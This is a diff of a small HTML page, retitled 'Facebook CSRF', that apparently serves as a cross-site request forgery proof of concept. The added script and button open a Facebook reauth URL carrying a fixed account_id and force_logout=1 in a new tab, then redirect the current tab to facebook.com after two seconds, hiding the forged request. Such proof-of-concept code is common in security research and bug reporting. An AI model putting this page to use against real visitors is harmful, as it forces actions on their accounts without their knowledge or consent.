@@ -1,13 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Open Facebook Reauth</title>
+  <title>Facebook CSRF</title>
+  <script>
+    function handleClick() {
+      // Open in new tab
+      window.open('https://www.facebook.com/fxreauth/?app_id=1217981644879628&etoken=test&account_id=100033825612932&force_logout=1', '_blank');
+
+      // Wait for 2 seconds, then redirect current tab
+      setTimeout(function() {
+        window.location.replace('https://www.facebook.com');
+      }, 2000); // 2000 ms = 2 seconds
+    }
+  </script>
 </head>
 <body>
 
-  <button onclick="window.open('https://www.facebook.com/fxreauth/?app_id=1217981644879628&etoken=test&account_id=100033825612932&force_logout=1', '_blank')">
-    Open Facebook Reauth
-  </button>
+  <button onclick="handleClick()">CSRF FB</button>
 
 </body>
 </html>
